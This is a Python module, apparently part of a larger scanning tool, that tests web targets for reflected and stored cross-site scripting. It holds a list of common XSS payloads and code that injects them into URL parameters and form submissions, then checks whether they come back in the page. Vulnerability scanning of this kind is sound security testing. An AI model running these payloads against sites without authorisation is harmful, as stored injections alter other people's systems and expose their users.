# task_xss.py
"""
XSS (Cross-Site Scripting) vulnerability testing.
"""

import requests
from typing import List, Dict, Optional
from urllib.parse import urljoin, quote
from ai_core import get_with_retry, post_with_retry
from config import REQUEST_USER_AGENT


class XSSTester:
    """Tests for XSS vulnerabilities."""
    
    # Common XSS payloads
    PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "'-alert('XSS')-'",
        "\"><script>alert('XSS')</script>",
        "<ScRiPt>alert('XSS')</sCrIpT>",
        "%3Cscript%3Ealert('XSS')%3C/script%3E"
    ]
    
    def __init__(self):
        self.results = []
        
    def test_reflected_xss(self, url: str, parameters: List[str]) -> List[Dict[str, any]]:
        """
        Test for reflected XSS.
        
        Args:
            url: Target URL
            parameters: List of parameter names to test
            
        Returns:
            List of findings
        """
        print(f"\n[XSS] Testing reflected XSS on {url}")
        
        findings = []
        
        for param in parameters:
            for payload in self.PAYLOADS[:5]:  # Test first 5 payloads
                test_url = f"{url}?{param}={quote(payload)}"
                
                try:
                    response = get_with_retry(test_url, timeout=10)
                    
                    if response and payload in response.text:
                        finding = {
                            'type': 'reflected_xss',
                            'url': url,
                            'parameter': param,
                            'payload': payload,
                            'severity': 'medium',
                            'confirmed': True
                        }
                        findings.append(finding)
                        print(f"[XSS] ⚠️ Potential XSS: {param} with payload: {payload[:30]}")
                        break  # Found vulnerability, move to next parameter
                        
                except Exception as e:
                    print(f"[XSS] Error testing {param}: {str(e)[:50]}")
                    
        self.results.extend(findings)
        return findings
        
    def test_stored_xss(self, url: str, form_data: Dict[str, str]) -> List[Dict[str, any]]:
        """
        Test for stored XSS.
        
        Args:
            url: Target URL
            form_data: Form data with parameter names
            
        Returns:
            List of findings
        """
        print(f"\n[XSS] Testing stored XSS on {url}")
        
        findings = []
        
        for param in form_data.keys():
            for payload in self.PAYLOADS[:3]:  # Test first 3 payloads
                test_data = form_data.copy()
                test_data[param] = payload
                
                try:
                    # Submit form
                    response = post_with_retry(url, data=test_data, timeout=10)
                    
                    if response and response.status_code in [200, 201]:
                        # Try to retrieve and check if payload is stored
                        get_response = get_with_retry(url, timeout=10)
                        
                        if get_response and payload in get_response.text:
                            finding = {
                                'type': 'stored_xss',
                                'url': url,
                                'parameter': param,
                                'payload': payload,
                                'severity': 'high',
                                'confirmed': True
                            }
                            findings.append(finding)
                            print(f"[XSS] ⚠️ Potential stored XSS: {param}")
                            break
                            
                except Exception as e:
                    print(f"[XSS] Error testing {param}: {str(e)[:50]}")
                    
        self.results.extend(findings)
        return findings
        
    def get_results(self) -> List[Dict[str, any]]:
        """Get all test results."""
        return self.results


def test_xss_vulnerabilities(url: str, parameters: List[str] = None,
                            form_data: Dict[str, str] = None) -> Dict[str, any]:
    """
    Test for XSS vulnerabilities.
    
    Args:
        url: Target URL
        parameters: URL parameters to test
        form_data: Form data to test
        
    Returns:
        Test results dictionary
    """
    tester = XSSTester()
    
    results = {
        'url': url,
        'reflected_xss': [],
        'stored_xss': [],
        'total_findings': 0
    }
    
    if parameters:
        results['reflected_xss'] = tester.test_reflected_xss(url, parameters)
        
    if form_data:
        results['stored_xss'] = tester.test_stored_xss(url, form_data)
        
    results['total_findings'] = len(results['reflected_xss']) + len(results['stored_xss'])
    
    print(f"\n[XSS] ✅ Testing complete: {results['total_findings']} findings")
    
    return results
